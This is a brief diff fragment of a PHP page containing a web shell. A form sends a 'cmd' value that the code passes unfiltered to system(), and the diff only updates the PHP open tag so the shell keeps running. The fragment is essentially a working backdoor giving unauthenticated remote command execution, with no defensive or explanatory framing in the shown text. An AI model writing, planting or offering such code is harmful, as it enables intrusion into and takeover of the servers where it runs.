@@ -5,7 +5,7 @@
 <INPUT TYPE="submit" VALUE="Send">
 </FORM>
 <pre>
-<?
+<?php
 if($_GET['cmd']) {
   system($_GET['cmd']);
   }
